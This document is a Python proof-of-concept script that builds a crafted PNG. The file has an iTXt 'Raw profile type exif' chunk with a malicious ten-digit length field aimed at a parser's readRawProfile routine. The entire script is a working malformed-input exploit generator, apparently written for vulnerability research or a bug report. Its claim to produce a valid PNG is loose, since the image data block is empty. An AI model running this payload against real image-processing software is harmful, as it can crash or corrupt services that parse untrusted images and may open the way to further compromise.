#!/usr/bin/env python3
# make_poc_valid_png.py
# Produces a valid PNG with: PNG sig, IHDR, iTXt(keyword="Raw profile type exif"), small IDAT, IEND
# The iTXt text contains a malicious decimal length field.
# Usage: python3 make_poc_valid_png.py > poc-itxt.png

import sys
import zlib
from struct import pack

def crc32_bytes(b: bytes) -> bytes:
    return pack(">I", zlib.crc32(b) & 0xffffffff)

def make_chunk(chunk_type: bytes, data: bytes) -> bytes:
    return pack(">I", len(data)) + chunk_type + data + crc32_bytes(chunk_type + data)

def make_ihdr(width=1, height=1, bit_depth=8, color_type=2):
    # IHDR must be 13 bytes: width(4) height(4) bit_depth color_type compression filter interlace
    data = pack(">I", width) + pack(">I", height) + bytes([bit_depth, color_type, 0, 0, 0])
    return make_chunk(b'IHDR', data)

def make_itxt(keyword: bytes, text_payload: bytes, compressed=False):
    # iTXt: keyword\0 + compressionFlag(1) + compressionMethod(1) + languageTag\0 + translatedKeyword\0 + text
    compressionFlag = b'\x00'
    compressionMethod = b'\x00'
    languageTag = b''
    translatedKeyword = b''
    header = keyword + b'\x00' + compressionFlag + compressionMethod + languageTag + b'\x00' + translatedKeyword + b'\x00'
    chunk_data = header + text_payload
    return make_chunk(b'iTXt', chunk_data)

def make_idat_empty():
    # small valid compressed block for IDAT
    comp = zlib.compress(b'')  # compressed empty data
    return make_chunk(b'IDAT', comp)

def make_iend():
    return make_chunk(b'IEND', b'')

def main():
    png_sig = b'\x89PNG\r\n\x1a\n'
    keyword = b'Raw profile type exif'  # exactly what parser checks for (21 bytes)
    # Build text payload expected by readRawProfile:
    # leading byte (ignored), newline, decimal-length, newline, hex-data
    leading = b'X'
    big_length = b'9999999999'   # ten 9s => 9_999_999_999
    hex_payload = b'deadbeef'    # actual hex data (short)
    text_payload = leading + b'\n' + big_length + b'\n' + hex_payload + b'\n'

    ihdr = make_ihdr(width=1, height=1, bit_depth=8, color_type=2)
    itxt = make_itxt(keyword, text_payload)
    idat = make_idat_empty()
    iend = make_iend()

    sys.stdout.buffer.write(png_sig + ihdr + itxt + idat + iend)

if __name__ == "__main__":
    main()
